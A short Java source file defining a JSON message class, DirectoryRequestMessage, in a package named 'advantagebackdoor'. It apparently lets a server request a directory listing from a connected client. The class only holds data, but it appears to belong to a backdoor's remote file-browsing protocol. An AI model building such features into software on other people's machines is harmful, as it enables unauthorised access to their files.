package me.faintcloudy.advantagebackdoor.api.message.play.server;

import com.alibaba.fastjson.annotation.JSONField;
import me.faintcloudy.advantagebackdoor.api.message.play.client.DirectoryMessage;

public class DirectoryRequestMessage extends RequestMessage {
    @JSONField
    public String path;

    public DirectoryRequestMessage(String path) {
        super(DirectoryMessage.class);
        this.path = path;
    }
    public DirectoryRequestMessage() {}
}
